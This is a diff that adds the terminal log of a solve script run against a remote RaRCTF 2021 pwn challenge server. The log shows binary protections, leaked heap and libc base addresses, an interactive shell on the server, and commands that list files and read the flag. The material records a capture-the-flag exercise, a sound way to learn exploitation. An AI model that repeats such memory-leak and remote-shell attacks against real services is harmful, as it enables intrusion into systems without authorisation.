@@ -1,0 +1,48 @@
+mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_Return_of_Emoji_DB_600/Emoji$ python3 solve.py r
+[*] '/home/mito/CTF/RaRCTF_2021/Pwn_Return_of_Emoji_DB_600/Emoji/emoji'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 193.57.159.27 on port 28933: Done
+[*] '/home/mito/CTF/RaRCTF_2021/Pwn_Return_of_Emoji_DB_600/Emoji/libc-2.31.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+heap_leak = 0x5644234ec2b4
+heap_base = 0x5644234eb000
+libc_leak = 0x7efe7f849be0
+libc_base = 0x7efe7f65e000
+[*] Switching to interactive mode
+$ id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+$ ls -l
+total 28
+lrwxrwxrwx.    1 root root     7 Jul 23 17:35 bin -> usr/bin
+drwxr-xr-x.    2 root root     6 Apr 15  2020 boot
+drwxr-xr-x.    5 root root   340 Aug 10 01:16 dev
+-rwxr-xr-x.    1 root root 20912 Aug  6 10:27 emoji
+drwxr-xr-x.    1 root root    66 Aug  8 15:06 etc
+-rw-r--r--.    1 root root    38 Aug  3 01:39 flag.txt
+drwxr-xr-x.    1 root root    17 Aug  8 14:53 home
+lrwxrwxrwx.    1 root root     7 Jul 23 17:35 lib -> usr/lib
+lrwxrwxrwx.    1 root root     9 Jul 23 17:35 lib32 -> usr/lib32
+lrwxrwxrwx.    1 root root     9 Jul 23 17:35 lib64 -> usr/lib64
+lrwxrwxrwx.    1 root root    10 Jul 23 17:35 libx32 -> usr/libx32
+drwxr-xr-x.    2 root root     6 Jul 23 17:35 media
+drwxr-xr-x.    2 root root     6 Jul 23 17:35 mnt
+drwxr-xr-x.    2 root root     6 Jul 23 17:35 opt
+dr-xr-xr-x. 1366 root root     0 Aug 10 01:16 proc
+drwx------.    2 root root    37 Jul 23 17:38 root
+drwxr-xr-x.    5 root root    58 Jul 23 17:38 run
+lrwxrwxrwx.    1 root root     8 Jul 23 17:35 sbin -> usr/sbin
+drwxr-xr-x.    2 root root     6 Jul 23 17:35 srv
+dr-xr-xr-x.   13 root root     0 Aug 10 01:14 sys
+drwxrwxrwt.    2 root root     6 Jul 23 17:38 tmp
+drwxr-xr-x.    1 root root    41 Jul 23 17:35 usr
+drwxr-xr-x.    1 root root    17 Jul 23 17:38 var
+$ cat flag.txt
+rarctf{tru5t_th3_f1r5t_byt3_1bc8d429}
